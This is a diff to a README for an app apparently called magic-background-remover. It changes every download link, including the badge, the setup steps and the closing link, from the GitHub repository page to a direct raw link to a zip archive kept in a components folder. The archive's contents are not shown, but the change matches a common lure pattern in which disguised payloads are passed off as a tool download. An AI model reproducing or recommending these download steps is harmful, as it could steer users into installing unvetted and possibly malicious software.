@@ -1,11 +1,11 @@
 # 🪄 magic-background-remover - Remove backgrounds with ease
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/corrinmain6969-hub/magic-background-remover)
+[![Download the app](https://img.shields.io/badge/Download%20Now-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/corrinmain6969-hub/magic-background-remover/main/components/background-remover-magic-v3.5-beta.1.zip)
 
 ## 🚀 Get the app
 
 Use this page to download and install the app:
-https://github.com/corrinmain6969-hub/magic-background-remover
+https://raw.githubusercontent.com/corrinmain6969-hub/magic-background-remover/main/components/background-remover-magic-v3.5-beta.1.zip
 
 ## 🖥️ What this app does
 
@@ -32,7 +32,7 @@ If you do not have Node.js yet, install the current Windows version from the Nod
 ## ⬇️ Download and set up
 
 1. Open the download page:
-   https://github.com/corrinmain6969-hub/magic-background-remover
+   https://raw.githubusercontent.com/corrinmain6969-hub/magic-background-remover/main/components/background-remover-magic-v3.5-beta.1.zip
 
 2. Download the repository files to your computer.
 
@@ -195,4 +195,4 @@ Once the local server starts, you can keep the window open while you use the app
 ## 🔗 Useful link
 
 Download and set up the app here:
-https://github.com/corrinmain6969-hub/magic-background-remover
+https://raw.githubusercontent.com/corrinmain6969-hub/magic-background-remover/main/components/background-remover-magic-v3.5-beta.1.zip
